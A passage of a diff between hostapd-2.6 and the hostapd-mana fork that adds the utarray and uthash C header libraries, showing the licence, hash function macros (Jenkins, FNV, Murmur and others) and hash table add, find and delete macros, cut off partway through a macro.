> #define utarray_prev(a,e) (((e)==NULL) ? utarray_back(a) : ((utarray_eltidx(a,e) > 0) ? _utarray_eltptr(a,utarray_eltidx(a,e)-1) : NULL))
> #define utarray_back(a) (((a)->i) ? (_utarray_eltptr(a,(a)->i-1)) : NULL)
> #define utarray_eltidx(a,e) (((char*)(e) >= (char*)((a)->d)) ? (((char*)(e) - (char*)((a)->d))/(ssize_t)(a)->icd.sz) : -1)
> 
> /* last we pre-define a few icd for common utarrays of ints and strings */
> static void utarray_str_cpy(void *dst, const void *src) {
>   char **_src = (char**)src, **_dst = (char**)dst;
>   *_dst = (*_src == NULL) ? NULL : strdup(*_src);
> }
> static void utarray_str_dtor(void *elt) {
>   char **eltc = (char**)elt;
>   if (*eltc) free(*eltc);
> }
> static const UT_icd ut_str_icd _UNUSED_ = {sizeof(char*),NULL,utarray_str_cpy,utarray_str_dtor};
> static const UT_icd ut_int_icd _UNUSED_ = {sizeof(int),NULL,NULL,NULL};
> static const UT_icd ut_ptr_icd _UNUSED_ = {sizeof(void*),NULL,NULL,NULL};
> 
> 
> #endif /* UTARRAY_H */
diff '--color=auto' -rN hostapd-2.6/src/ap/uthash/uthash.h hostapd-mana/src/ap/uthash/uthash.h
0a1,948
> /*
> Copyright (c) 2003-2014, Troy D. Hanson     http://troydhanson.github.com/uthash/
> All rights reserved.
> 
> Redistribution and use in source and binary forms, with or without
> modification, are permitted provided that the following conditions are met:
> 
>     * Redistributions of source code must retain the above copyright
>       notice, this list of conditions and the following disclaimer.
> 
> THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS
> IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
> TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
> PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER
> OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
> EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
> PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
> LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
> NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
> SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
> */
> 
> #ifndef UTHASH_H
> #define UTHASH_H 
> 
> #include <string.h>   /* memcmp,strlen */
> #include <stddef.h>   /* ptrdiff_t */
> #include <stdlib.h>   /* exit() */
> 
> /* These macros use decltype or the earlier __typeof GNU extension.
>    As decltype is only available in newer compilers (VS2010 or gcc 4.3+
>    when compiling c++ source) this code uses whatever method is needed
>    or, for VS2008 where neither is available, uses casting workarounds. */
> #ifdef _MSC_VER         /* MS compiler */
> #if _MSC_VER >= 1600 && defined(__cplusplus)  /* VS2010 or newer in C++ mode */
> #define DECLTYPE(x) (decltype(x))
> #else                   /* VS2008 or older (or VS2010 in C mode) */
> #define NO_DECLTYPE
> #define DECLTYPE(x)
> #endif
> #else                   /* GNU, Sun and other compilers */
> #define DECLTYPE(x) (__typeof(x))
> #endif
> 
> #ifdef NO_DECLTYPE
> #define DECLTYPE_ASSIGN(dst,src)                                                 \
> do {                                                                             \
>   char **_da_dst = (char**)(&(dst));                                             \
>   *_da_dst = (char*)(src);                                                       \
> } while(0)
> #else 
> #define DECLTYPE_ASSIGN(dst,src)                                                 \
> do {                                                                             \
>   (dst) = DECLTYPE(dst)(src);                                                    \
> } while(0)
> #endif
> 
> /* a number of the hash function use uint32_t which isn't defined on win32 */
> #ifdef _MSC_VER
> typedef unsigned int uint32_t;
> typedef unsigned char uint8_t;
> #else
> #include <inttypes.h>   /* uint32_t */
> #endif
> 
> #define UTHASH_VERSION 1.9.9
> 
> #ifndef uthash_fatal
> #define uthash_fatal(msg) exit(-1)        /* fatal error (out of memory,etc) */
> #endif
> #ifndef uthash_malloc
> #define uthash_malloc(sz) malloc(sz)      /* malloc fcn                      */
> #endif
> #ifndef uthash_free
> #define uthash_free(ptr,sz) free(ptr)     /* free fcn                        */
> #endif
> 
> #ifndef uthash_noexpand_fyi
> #define uthash_noexpand_fyi(tbl)          /* can be defined to log noexpand  */
> #endif
> #ifndef uthash_expand_fyi
> #define uthash_expand_fyi(tbl)            /* can be defined to log expands   */
> #endif
> 
> /* initial number of buckets */
> #define HASH_INITIAL_NUM_BUCKETS 32      /* initial number of buckets        */
> #define HASH_INITIAL_NUM_BUCKETS_LOG2 5  /* lg2 of initial number of buckets */
> #define HASH_BKT_CAPACITY_THRESH 10      /* expand when bucket count reaches */
> 
> /* calculate the element whose hash handle address is hhe */
> #define ELMT_FROM_HH(tbl,hhp) ((void*)(((char*)(hhp)) - ((tbl)->hho)))
> 
> #define HASH_FIND(hh,head,keyptr,keylen,out)                                     \
> do {                                                                             \
>   unsigned _hf_bkt,_hf_hashv;                                                    \
>   out=NULL;                                                                      \
>   if (head) {                                                                    \
>      HASH_FCN(keyptr,keylen, (head)->hh.tbl->num_buckets, _hf_hashv, _hf_bkt);   \
>      if (HASH_BLOOM_TEST((head)->hh.tbl, _hf_hashv)) {                           \
>        HASH_FIND_IN_BKT((head)->hh.tbl, hh, (head)->hh.tbl->buckets[ _hf_bkt ],  \
>                         keyptr,keylen,out);                                      \
>      }                                                                           \
>   }                                                                              \
> } while (0)
> 
> #ifdef HASH_BLOOM
> #define HASH_BLOOM_BITLEN (1ULL << HASH_BLOOM)
> #define HASH_BLOOM_BYTELEN (HASH_BLOOM_BITLEN/8) + ((HASH_BLOOM_BITLEN%8) ? 1:0)
> #define HASH_BLOOM_MAKE(tbl)                                                     \
> do {                                                                             \
>   (tbl)->bloom_nbits = HASH_BLOOM;                                               \
>   (tbl)->bloom_bv = (uint8_t*)uthash_malloc(HASH_BLOOM_BYTELEN);                 \
>   if (!((tbl)->bloom_bv))  { uthash_fatal( "out of memory"); }                   \
>   memset((tbl)->bloom_bv, 0, HASH_BLOOM_BYTELEN);                                \
>   (tbl)->bloom_sig = HASH_BLOOM_SIGNATURE;                                       \
> } while (0) 
> 
> #define HASH_BLOOM_FREE(tbl)                                                     \
> do {                                                                             \
>   uthash_free((tbl)->bloom_bv, HASH_BLOOM_BYTELEN);                              \
> } while (0) 
> 
> #define HASH_BLOOM_BITSET(bv,idx) (bv[(idx)/8] |= (1U << ((idx)%8)))
> #define HASH_BLOOM_BITTEST(bv,idx) (bv[(idx)/8] & (1U << ((idx)%8)))
> 
> #define HASH_BLOOM_ADD(tbl,hashv)                                                \
>   HASH_BLOOM_BITSET((tbl)->bloom_bv, (hashv & (uint32_t)((1ULL << (tbl)->bloom_nbits) - 1)))
> 
> #define HASH_BLOOM_TEST(tbl,hashv)                                               \
>   HASH_BLOOM_BITTEST((tbl)->bloom_bv, (hashv & (uint32_t)((1ULL << (tbl)->bloom_nbits) - 1)))
> 
> #else
> #define HASH_BLOOM_MAKE(tbl) 
> #define HASH_BLOOM_FREE(tbl) 
> #define HASH_BLOOM_ADD(tbl,hashv) 
> #define HASH_BLOOM_TEST(tbl,hashv) (1)
> #define HASH_BLOOM_BYTELEN 0
> #endif
> 
> #define HASH_MAKE_TABLE(hh,head)                                                 \
> do {                                                                             \
>   (head)->hh.tbl = (UT_hash_table*)uthash_malloc(                                \
>                   sizeof(UT_hash_table));                                        \
>   if (!((head)->hh.tbl))  { uthash_fatal( "out of memory"); }                    \
>   memset((head)->hh.tbl, 0, sizeof(UT_hash_table));                              \
>   (head)->hh.tbl->tail = &((head)->hh);                                          \
>   (head)->hh.tbl->num_buckets = HASH_INITIAL_NUM_BUCKETS;                        \
>   (head)->hh.tbl->log2_num_buckets = HASH_INITIAL_NUM_BUCKETS_LOG2;              \
>   (head)->hh.tbl->hho = (char*)(&(head)->hh) - (char*)(head);                    \
>   (head)->hh.tbl->buckets = (UT_hash_bucket*)uthash_malloc(                      \
>           HASH_INITIAL_NUM_BUCKETS*sizeof(struct UT_hash_bucket));               \
>   if (! (head)->hh.tbl->buckets) { uthash_fatal( "out of memory"); }             \
>   memset((head)->hh.tbl->buckets, 0,                                             \
>           HASH_INITIAL_NUM_BUCKETS*sizeof(struct UT_hash_bucket));               \
>   HASH_BLOOM_MAKE((head)->hh.tbl);                                               \
>   (head)->hh.tbl->signature = HASH_SIGNATURE;                                    \
> } while(0)
> 
> #define HASH_ADD(hh,head,fieldname,keylen_in,add)                                \
>         HASH_ADD_KEYPTR(hh,head,&((add)->fieldname),keylen_in,add)
> 
> #define HASH_REPLACE(hh,head,fieldname,keylen_in,add,replaced)                   \
> do {                                                                             \
>   replaced=NULL;                                                                 \
>   HASH_FIND(hh,head,&((add)->fieldname),keylen_in,replaced);                     \
>   if (replaced!=NULL) {                                                          \
>      HASH_DELETE(hh,head,replaced);                                              \
>   };                                                                             \
>   HASH_ADD(hh,head,fieldname,keylen_in,add);                                     \
> } while(0)
>  
> #define HASH_ADD_KEYPTR(hh,head,keyptr,keylen_in,add)                            \
> do {                                                                             \
>  unsigned _ha_bkt;                                                               \
>  (add)->hh.next = NULL;                                                          \
>  (add)->hh.key = (char*)(keyptr);                                                \
>  (add)->hh.keylen = (unsigned)(keylen_in);                                       \
>  if (!(head)) {                                                                  \
>     head = (add);                                                                \
>     (head)->hh.prev = NULL;                                                      \
>     HASH_MAKE_TABLE(hh,head);                                                    \
>  } else {                                                                        \
>     (head)->hh.tbl->tail->next = (add);                                          \
>     (add)->hh.prev = ELMT_FROM_HH((head)->hh.tbl, (head)->hh.tbl->tail);         \
>     (head)->hh.tbl->tail = &((add)->hh);                                         \
>  }                                                                               \
>  (head)->hh.tbl->num_items++;                                                    \
>  (add)->hh.tbl = (head)->hh.tbl;                                                 \
>  HASH_FCN(keyptr,keylen_in, (head)->hh.tbl->num_buckets,                         \
>          (add)->hh.hashv, _ha_bkt);                                              \
>  HASH_ADD_TO_BKT((head)->hh.tbl->buckets[_ha_bkt],&(add)->hh);                   \
>  HASH_BLOOM_ADD((head)->hh.tbl,(add)->hh.hashv);                                 \
>  HASH_EMIT_KEY(hh,head,keyptr,keylen_in);                                        \
>  HASH_FSCK(hh,head);                                                             \
> } while(0)
> 
> #define HASH_TO_BKT( hashv, num_bkts, bkt )                                      \
> do {                                                                             \
>   bkt = ((hashv) & ((num_bkts) - 1));                                            \
> } while(0)
> 
> /* delete "delptr" from the hash table.
>  * "the usual" patch-up process for the app-order doubly-linked-list.
>  * The use of _hd_hh_del below deserves special explanation.
>  * These used to be expressed using (delptr) but that led to a bug
>  * if someone used the same symbol for the head and deletee, like
>  *  HASH_DELETE(hh,users,users);
>  * We want that to work, but by changing the head (users) below
>  * we were forfeiting our ability to further refer to the deletee (users)
>  * in the patch-up process. Solution: use scratch space to
>  * copy the deletee pointer, then the latter references are via that
>  * scratch pointer rather than through the repointed (users) symbol.
>  */
> #define HASH_DELETE(hh,head,delptr)                                              \
> do {                                                                             \
>     unsigned _hd_bkt;                                                            \
>     struct UT_hash_handle *_hd_hh_del;                                           \
>     if ( ((delptr)->hh.prev == NULL) && ((delptr)->hh.next == NULL) )  {         \
>         uthash_free((head)->hh.tbl->buckets,                                     \
>                     (head)->hh.tbl->num_buckets*sizeof(struct UT_hash_bucket) ); \
>         HASH_BLOOM_FREE((head)->hh.tbl);                                         \
>         uthash_free((head)->hh.tbl, sizeof(UT_hash_table));                      \
>         head = NULL;                                                             \
>     } else {                                                                     \
>         _hd_hh_del = &((delptr)->hh);                                            \
>         if ((delptr) == ELMT_FROM_HH((head)->hh.tbl,(head)->hh.tbl->tail)) {     \
>             (head)->hh.tbl->tail =                                               \
>                 (UT_hash_handle*)((ptrdiff_t)((delptr)->hh.prev) +               \
>                 (head)->hh.tbl->hho);                                            \
>         }                                                                        \
>         if ((delptr)->hh.prev) {                                                 \
>             ((UT_hash_handle*)((ptrdiff_t)((delptr)->hh.prev) +                  \
>                     (head)->hh.tbl->hho))->next = (delptr)->hh.next;             \
>         } else {                                                                 \
>             DECLTYPE_ASSIGN(head,(delptr)->hh.next);                             \
>         }                                                                        \
>         if (_hd_hh_del->next) {                                                  \
>             ((UT_hash_handle*)((ptrdiff_t)_hd_hh_del->next +                     \
>                     (head)->hh.tbl->hho))->prev =                                \
>                     _hd_hh_del->prev;                                            \
>         }                                                                        \
>         HASH_TO_BKT( _hd_hh_del->hashv, (head)->hh.tbl->num_buckets, _hd_bkt);   \
>         HASH_DEL_IN_BKT(hh,(head)->hh.tbl->buckets[_hd_bkt], _hd_hh_del);        \
>         (head)->hh.tbl->num_items--;                                             \
>     }                                                                            \
>     HASH_FSCK(hh,head);                                                          \
> } while (0)
> 
> 
> /* convenience forms of HASH_FIND/HASH_ADD/HASH_DEL */
> #define HASH_FIND_STR(head,findstr,out)                                          \
>     HASH_FIND(hh,head,findstr,strlen(findstr),out)
> #define HASH_ADD_STR(head,strfield,add)                                          \
>     HASH_ADD(hh,head,strfield[0],strlen(add->strfield),add)
> #define HASH_REPLACE_STR(head,strfield,add,replaced)                             \
>   HASH_REPLACE(hh,head,strfield,strlen(add->strfield),add,replaced)
> #define HASH_FIND_INT(head,findint,out)                                          \
>     HASH_FIND(hh,head,findint,sizeof(int),out)
> #define HASH_ADD_INT(head,intfield,add)                                          \
>     HASH_ADD(hh,head,intfield,sizeof(int),add)
> #define HASH_REPLACE_INT(head,intfield,add,replaced)                             \
>     HASH_REPLACE(hh,head,intfield,sizeof(int),add,replaced)
> #define HASH_FIND_PTR(head,findptr,out)                                          \
>     HASH_FIND(hh,head,findptr,sizeof(void *),out)
> #define HASH_ADD_PTR(head,ptrfield,add)                                          \
>     HASH_ADD(hh,head,ptrfield,sizeof(void *),add)
> #define HASH_REPLACE_PTR(head,ptrfield,add,replaced)                             \
>     HASH_REPLACE(hh,head,ptrfield,sizeof(void *),add,replaced)
> #define HASH_DEL(head,delptr)                                                    \
>     HASH_DELETE(hh,head,delptr)
> 
> /* HASH_FSCK checks hash integrity on every add/delete when HASH_DEBUG is defined.
>  * This is for uthash developer only; it compiles away if HASH_DEBUG isn't defined.
>  */
> #ifdef HASH_DEBUG
> #define HASH_OOPS(...) do { fprintf(stderr,__VA_ARGS__); exit(-1); } while (0)
> #define HASH_FSCK(hh,head)                                                       \
> do {                                                                             \
>     unsigned _bkt_i;                                                             \
>     unsigned _count, _bkt_count;                                                 \
>     char *_prev;                                                                 \
>     struct UT_hash_handle *_thh;                                                 \
>     if (head) {                                                                  \
>         _count = 0;                                                              \
>         for( _bkt_i = 0; _bkt_i < (head)->hh.tbl->num_buckets; _bkt_i++) {       \
>             _bkt_count = 0;                                                      \
>             _thh = (head)->hh.tbl->buckets[_bkt_i].hh_head;                      \
>             _prev = NULL;                                                        \
>             while (_thh) {                                                       \
>                if (_prev != (char*)(_thh->hh_prev)) {                            \
>                    HASH_OOPS("invalid hh_prev %p, actual %p\n",                  \
>                     _thh->hh_prev, _prev );                                      \
>                }                                                                 \
>                _bkt_count++;                                                     \
>                _prev = (char*)(_thh);                                            \
>                _thh = _thh->hh_next;                                             \
>             }                                                                    \
>             _count += _bkt_count;                                                \
>             if ((head)->hh.tbl->buckets[_bkt_i].count !=  _bkt_count) {          \
>                HASH_OOPS("invalid bucket count %d, actual %d\n",                 \
>                 (head)->hh.tbl->buckets[_bkt_i].count, _bkt_count);              \
>             }                                                                    \
>         }                                                                        \
>         if (_count != (head)->hh.tbl->num_items) {                               \
>             HASH_OOPS("invalid hh item count %d, actual %d\n",                   \
>                 (head)->hh.tbl->num_items, _count );                             \
>         }                                                                        \
>         /* traverse hh in app order; check next/prev integrity, count */         \
>         _count = 0;                                                              \
>         _prev = NULL;                                                            \
>         _thh =  &(head)->hh;                                                     \
>         while (_thh) {                                                           \
>            _count++;                                                             \
>            if (_prev !=(char*)(_thh->prev)) {                                    \
>               HASH_OOPS("invalid prev %p, actual %p\n",                          \
>                     _thh->prev, _prev );                                         \
>            }                                                                     \
>            _prev = (char*)ELMT_FROM_HH((head)->hh.tbl, _thh);                    \
>            _thh = ( _thh->next ?  (UT_hash_handle*)((char*)(_thh->next) +        \
>                                   (head)->hh.tbl->hho) : NULL );                 \
>         }                                                                        \
>         if (_count != (head)->hh.tbl->num_items) {                               \
>             HASH_OOPS("invalid app item count %d, actual %d\n",                  \
>                 (head)->hh.tbl->num_items, _count );                             \
>         }                                                                        \
>     }                                                                            \
> } while (0)
> #else
> #define HASH_FSCK(hh,head) 
> #endif
> 
> /* When compiled with -DHASH_EMIT_KEYS, length-prefixed keys are emitted to 
>  * the descriptor to which this macro is defined for tuning the hash function.
>  * The app can #include <unistd.h> to get the prototype for write(2). */
> #ifdef HASH_EMIT_KEYS
> #define HASH_EMIT_KEY(hh,head,keyptr,fieldlen)                                   \
> do {                                                                             \
>     unsigned _klen = fieldlen;                                                   \
>     write(HASH_EMIT_KEYS, &_klen, sizeof(_klen));                                \
>     write(HASH_EMIT_KEYS, keyptr, fieldlen);                                     \
> } while (0)
> #else 
> #define HASH_EMIT_KEY(hh,head,keyptr,fieldlen)                    
> #endif
> 
> /* default to Jenkin's hash unless overridden e.g. DHASH_FUNCTION=HASH_SAX */
> #ifdef HASH_FUNCTION 
> #define HASH_FCN HASH_FUNCTION
> #else
> #define HASH_FCN HASH_JEN
> #endif
> 
> /* The Bernstein hash function, used in Perl prior to v5.6 */
> #define HASH_BER(key,keylen,num_bkts,hashv,bkt)                                  \
> do {                                                                             \
>   unsigned _hb_keylen=keylen;                                                    \
>   char *_hb_key=(char*)(key);                                                    \
>   (hashv) = 0;                                                                   \
>   while (_hb_keylen--)  { (hashv) = ((hashv) * 33) + *_hb_key++; }               \
>   bkt = (hashv) & (num_bkts-1);                                                  \
> } while (0)
> 
> 
> /* SAX/FNV/OAT/JEN hash functions are macro variants of those listed at 
>  * http://eternallyconfuzzled.com/tuts/algorithms/jsw_tut_hashing.aspx */
> #define HASH_SAX(key,keylen,num_bkts,hashv,bkt)                                  \
> do {                                                                             \
>   unsigned _sx_i;                                                                \
>   char *_hs_key=(char*)(key);                                                    \
>   hashv = 0;                                                                     \
>   for(_sx_i=0; _sx_i < keylen; _sx_i++)                                          \
>       hashv ^= (hashv << 5) + (hashv >> 2) + _hs_key[_sx_i];                     \
>   bkt = hashv & (num_bkts-1);                                                    \
> } while (0)
> 
> #define HASH_FNV(key,keylen,num_bkts,hashv,bkt)                                  \
> do {                                                                             \
>   unsigned _fn_i;                                                                \
>   char *_hf_key=(char*)(key);                                                    \
>   hashv = 2166136261UL;                                                          \
>   for(_fn_i=0; _fn_i < keylen; _fn_i++)                                          \
>       hashv = (hashv * 16777619) ^ _hf_key[_fn_i];                               \
>   bkt = hashv & (num_bkts-1);                                                    \
> } while(0) 
>  
> #define HASH_OAT(key,keylen,num_bkts,hashv,bkt)                                  \
> do {                                                                             \
>   unsigned _ho_i;                                                                \
>   char *_ho_key=(char*)(key);                                                    \
>   hashv = 0;                                                                     \
>   for(_ho_i=0; _ho_i < keylen; _ho_i++) {                                        \
>       hashv += _ho_key[_ho_i];                                                   \
>       hashv += (hashv << 10);                                                    \
>       hashv ^= (hashv >> 6);                                                     \
>   }                                                                              \
>   hashv += (hashv << 3);                                                         \
>   hashv ^= (hashv >> 11);                                                        \
>   hashv += (hashv << 15);                                                        \
>   bkt = hashv & (num_bkts-1);                                                    \
> } while(0)
> 
> #define HASH_JEN_MIX(a,b,c)                                                      \
> do {                                                                             \
>   a -= b; a -= c; a ^= ( c >> 13 );                                              \
>   b -= c; b -= a; b ^= ( a << 8 );                                               \
>   c -= a; c -= b; c ^= ( b >> 13 );                                              \
>   a -= b; a -= c; a ^= ( c >> 12 );                                              \
>   b -= c; b -= a; b ^= ( a << 16 );                                              \
>   c -= a; c -= b; c ^= ( b >> 5 );                                               \
>   a -= b; a -= c; a ^= ( c >> 3 );                                               \
>   b -= c; b -= a; b ^= ( a << 10 );                                              \
>   c -= a; c -= b; c ^= ( b >> 15 );                                              \
> } while (0)
> 
> #define HASH_JEN(key,keylen,num_bkts,hashv,bkt)                                  \
> do {                                                                             \
>   unsigned _hj_i,_hj_j,_hj_k;                                                    \
>   unsigned char *_hj_key=(unsigned char*)(key);                                  \
>   hashv = 0xfeedbeef;                                                            \
>   _hj_i = _hj_j = 0x9e3779b9;                                                    \
>   _hj_k = (unsigned)(keylen);                                                      \
>   while (_hj_k >= 12) {                                                          \
>     _hj_i +=    (_hj_key[0] + ( (unsigned)_hj_key[1] << 8 )                      \
>         + ( (unsigned)_hj_key[2] << 16 )                                         \
>         + ( (unsigned)_hj_key[3] << 24 ) );                                      \
>     _hj_j +=    (_hj_key[4] + ( (unsigned)_hj_key[5] << 8 )                      \
>         + ( (unsigned)_hj_key[6] << 16 )                                         \
>         + ( (unsigned)_hj_key[7] << 24 ) );                                      \
>     hashv += (_hj_key[8] + ( (unsigned)_hj_key[9] << 8 )                         \
>         + ( (unsigned)_hj_key[10] << 16 )                                        \
>         + ( (unsigned)_hj_key[11] << 24 ) );                                     \
>                                                                                  \
>      HASH_JEN_MIX(_hj_i, _hj_j, hashv);                                          \
>                                                                                  \
>      _hj_key += 12;                                                              \
>      _hj_k -= 12;                                                                \
>   }                                                                              \
>   hashv += keylen;                                                               \
>   switch ( _hj_k ) {                                                             \
>      case 11: hashv += ( (unsigned)_hj_key[10] << 24 );                          \
>      case 10: hashv += ( (unsigned)_hj_key[9] << 16 );                           \
>      case 9:  hashv += ( (unsigned)_hj_key[8] << 8 );                            \
>      case 8:  _hj_j += ( (unsigned)_hj_key[7] << 24 );                           \
>      case 7:  _hj_j += ( (unsigned)_hj_key[6] << 16 );                           \
>      case 6:  _hj_j += ( (unsigned)_hj_key[5] << 8 );                            \
>      case 5:  _hj_j += _hj_key[4];                                               \
>      case 4:  _hj_i += ( (unsigned)_hj_key[3] << 24 );                           \
>      case 3:  _hj_i += ( (unsigned)_hj_key[2] << 16 );                           \
>      case 2:  _hj_i += ( (unsigned)_hj_key[1] << 8 );                            \
>      case 1:  _hj_i += _hj_key[0];                                               \
>   }                                                                              \
>   HASH_JEN_MIX(_hj_i, _hj_j, hashv);                                             \
>   bkt = hashv & (num_bkts-1);                                                    \
> } while(0)
> 
> /* The Paul Hsieh hash function */
> #undef get16bits
> #if (defined(__GNUC__) && defined(__i386__)) || defined(__WATCOMC__)             \
>   || defined(_MSC_VER) || defined (__BORLANDC__) || defined (__TURBOC__)
> #define get16bits(d) (*((const uint16_t *) (d)))
> #endif
> 
> #if !defined (get16bits)
> #define get16bits(d) ((((uint32_t)(((const uint8_t *)(d))[1])) << 8)             \
>                        +(uint32_t)(((const uint8_t *)(d))[0]) )
> #endif
> #define HASH_SFH(key,keylen,num_bkts,hashv,bkt)                                  \
> do {                                                                             \
>   unsigned char *_sfh_key=(unsigned char*)(key);                                 \
>   uint32_t _sfh_tmp, _sfh_len = keylen;                                          \
>                                                                                  \
>   int _sfh_rem = _sfh_len & 3;                                                   \
>   _sfh_len >>= 2;                                                                \
>   hashv = 0xcafebabe;                                                            \
>                                                                                  \
>   /* Main loop */                                                                \
>   for (;_sfh_len > 0; _sfh_len--) {                                              \
>     hashv    += get16bits (_sfh_key);                                            \
>     _sfh_tmp       = (uint32_t)(get16bits (_sfh_key+2)) << 11  ^ hashv;          \
>     hashv     = (hashv << 16) ^ _sfh_tmp;                                        \
>     _sfh_key += 2*sizeof (uint16_t);                                             \
>     hashv    += hashv >> 11;                                                     \
>   }                                                                              \
>                                                                                  \
>   /* Handle end cases */                                                         \
>   switch (_sfh_rem) {                                                            \
>     case 3: hashv += get16bits (_sfh_key);                                       \
>             hashv ^= hashv << 16;                                                \
>             hashv ^= (uint32_t)(_sfh_key[sizeof (uint16_t)] << 18);              \
>             hashv += hashv >> 11;                                                \
>             break;                                                               \
>     case 2: hashv += get16bits (_sfh_key);                                       \
>             hashv ^= hashv << 11;                                                \
>             hashv += hashv >> 17;                                                \
>             break;                                                               \
>     case 1: hashv += *_sfh_key;                                                  \
>             hashv ^= hashv << 10;                                                \
>             hashv += hashv >> 1;                                                 \
>   }                                                                              \
>                                                                                  \
>     /* Force "avalanching" of final 127 bits */                                  \
>     hashv ^= hashv << 3;                                                         \
>     hashv += hashv >> 5;                                                         \
>     hashv ^= hashv << 4;                                                         \
>     hashv += hashv >> 17;                                                        \
>     hashv ^= hashv << 25;                                                        \
>     hashv += hashv >> 6;                                                         \
>     bkt = hashv & (num_bkts-1);                                                  \
> } while(0) 
> 
> #ifdef HASH_USING_NO_STRICT_ALIASING
> /* The MurmurHash exploits some CPU's (x86,x86_64) tolerance for unaligned reads.
>  * For other types of CPU's (e.g. Sparc) an unaligned read causes a bus error.
>  * MurmurHash uses the faster approach only on CPU's where we know it's safe. 
>  *
>  * Note the preprocessor built-in defines can be emitted using:
>  *
>  *   gcc -m64 -dM -E - < /dev/null                  (on gcc)
>  *   cc -## a.c (where a.c is a simple test file)   (Sun Studio)
>  */
> #if (defined(__i386__) || defined(__x86_64__)  || defined(_M_IX86))
> #define MUR_GETBLOCK(p,i) p[i]
> #else /* non intel */
> #define MUR_PLUS0_ALIGNED(p) (((unsigned long)p & 0x3) == 0)
> #define MUR_PLUS1_ALIGNED(p) (((unsigned long)p & 0x3) == 1)
> #define MUR_PLUS2_ALIGNED(p) (((unsigned long)p & 0x3) == 2)
> #define MUR_PLUS3_ALIGNED(p) (((unsigned long)p & 0x3) == 3)
> #define WP(p) ((uint32_t*)((unsigned long)(p) & ~3UL))
> #if (defined(__BIG_ENDIAN__) || defined(SPARC) || defined(__ppc__) || defined(__ppc64__))
> #define MUR_THREE_ONE(p) ((((*WP(p))&0x00ffffff) << 8) | (((*(WP(p)+1))&0xff000000) >> 24))
> #define MUR_TWO_TWO(p)   ((((*WP(p))&0x0000ffff) <<16) | (((*(WP(p)+1))&0xffff0000) >> 16))
> #define MUR_ONE_THREE(p) ((((*WP(p))&0x000000ff) <<24) | (((*(WP(p)+1))&0xffffff00) >>  8))
> #else /* assume little endian non-intel */
> #define MUR_THREE_ONE(p) ((((*WP(p))&0xffffff00) >> 8) | (((*(WP(p)+1))&0x000000ff) << 24))
> #define MUR_TWO_TWO(p)   ((((*WP(p))&0xffff0000) >>16) | (((*(WP(p)+1))&0x0000ffff) << 16))
> #define MUR_ONE_THREE(p) ((((*WP(p))&0xff000000) >>24) | (((*(WP(p)+1))&0x00ffffff) <<  8))
> #endif
> #define MUR_GETBLOCK(p,i) (MUR_PLUS0_ALIGNED(p) ? ((p)[i]) :           \
>                             (MUR_PLUS1_ALIGNED(p) ? MUR_THREE_ONE(p) : \
>                              (MUR_PLUS2_ALIGNED(p) ? MUR_TWO_TWO(p) :  \
>                                                       MUR_ONE_THREE(p))))
> #endif
> #define MUR_ROTL32(x,r) (((x) << (r)) | ((x) >> (32 - (r))))
> #define MUR_FMIX(_h) \
> do {                 \
>   _h ^= _h >> 16;    \
>   _h *= 0x85ebca6b;  \
>   _h ^= _h >> 13;    \
>   _h *= 0xc2b2ae35l; \
>   _h ^= _h >> 16;    \
> } while(0)
> 
> #define HASH_MUR(key,keylen,num_bkts,hashv,bkt)                        \
> do {                                                                   \
>   const uint8_t *_mur_data = (const uint8_t*)(key);                    \
>   const int _mur_nblocks = (keylen) / 4;                               \
>   uint32_t _mur_h1 = 0xf88D5353;                                       \
>   uint32_t _mur_c1 = 0xcc9e2d51;                                       \
>   uint32_t _mur_c2 = 0x1b873593;                                       \
>   uint32_t _mur_k1 = 0;                                                \
>   const uint8_t *_mur_tail;                                            \
>   const uint32_t *_mur_blocks = (const uint32_t*)(_mur_data+_mur_nblocks*4); \
>   int _mur_i;                                                          \
>   for(_mur_i = -_mur_nblocks; _mur_i; _mur_i++) {                      \
>     _mur_k1 = MUR_GETBLOCK(_mur_blocks,_mur_i);                        \
>     _mur_k1 *= _mur_c1;                                                \
>     _mur_k1 = MUR_ROTL32(_mur_k1,15);                                  \
>     _mur_k1 *= _mur_c2;                                                \
>                                                                        \
>     _mur_h1 ^= _mur_k1;                                                \
>     _mur_h1 = MUR_ROTL32(_mur_h1,13);                                  \
>     _mur_h1 = _mur_h1*5+0xe6546b64;                                    \
>   }                                                                    \
>   _mur_tail = (const uint8_t*)(_mur_data + _mur_nblocks*4);            \
>   _mur_k1=0;                                                           \
>   switch((keylen) & 3) {                                               \
>     case 3: _mur_k1 ^= _mur_tail[2] << 16;                             \
>     case 2: _mur_k1 ^= _mur_tail[1] << 8;                              \
>     case 1: _mur_k1 ^= _mur_tail[0];                                   \
>     _mur_k1 *= _mur_c1;                                                \
>     _mur_k1 = MUR_ROTL32(_mur_k1,15);                                  \
>     _mur_k1 *= _mur_c2;                                                \
>     _mur_h1 ^= _mur_k1;                                                \
>   }                                                                    \
>   _mur_h1 ^= (keylen);                                                 \
>   MUR_FMIX(_mur_h1);                                                   \
>   hashv = _mur_h1;                                                     \
>   bkt = hashv & (num_bkts-1);                                          \
> } while(0)
> #endif  /* HASH_USING_NO_STRICT_ALIASING */
> 
> /* key comparison function; return 0 if keys equal */
> #define HASH_KEYCMP(a,b,len) memcmp(a,b,len) 
> 
> /* iterate over items in a known bucket to find desired item */
> #define HASH_FIND_IN_BKT(tbl,hh,head,keyptr,keylen_in,out)                       \
> do {                                                                             \
>  if (head.hh_head) DECLTYPE_ASSIGN(out,ELMT_FROM_HH(tbl,head.hh_head));          \
>  else out=NULL;                                                                  \
>  while (out) {                                                                   \
>     if ((out)->hh.keylen == keylen_in) {                                           \
